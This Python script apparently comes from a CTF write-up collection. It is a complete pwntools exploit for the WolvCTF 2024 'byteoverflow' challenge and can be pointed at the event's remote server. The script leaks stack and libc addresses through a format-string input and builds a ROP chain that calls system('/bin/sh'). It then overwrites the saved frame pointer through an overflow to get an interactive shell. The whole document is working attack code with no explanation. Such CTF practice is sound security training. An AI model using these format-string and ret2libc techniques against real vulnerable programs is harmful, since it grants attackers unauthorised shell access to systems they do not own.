#!/usr/bin/env python3
import sys
from pwn import *

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/WolvCTF 2024/pwn/byteOverflow.com/byteoverflow')
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    # makeComment
    r.sendlineafter(b'3) EXIT\n', b'2')
    r.sendlineafter(b'Please write your comment below: \n\n', b'%38$p %45$p')
    r.recvuntil(b'Your comment is the following: \n')

    sfp, libc_main = map(lambda x: int(x, 16), r.recvline().strip().decode().split(' '))
    libc.address = libc_main - libc.libc_start_main_return
    binsh = next(libc.search(b'/bin/sh'))

    rop.raw(cyclic(0x128 - (sfp & 0xff)))
    rop.raw(rop.ret[0])
    rop.call(libc.sym.system, [binsh])

    payload = rop.chain()

    # lookPost - SFP overwrite
    r.sendlineafter(b'3) EXIT\n', b'1')
    r.sendlineafter(b'3) The Secret Society of Silent Print Statements - Debugging in Stealth Mode\n\n\n', payload + cyclic(0x100 - len(payload)) + b'\x00')

    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('byteoverflow.wolvctf.io', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
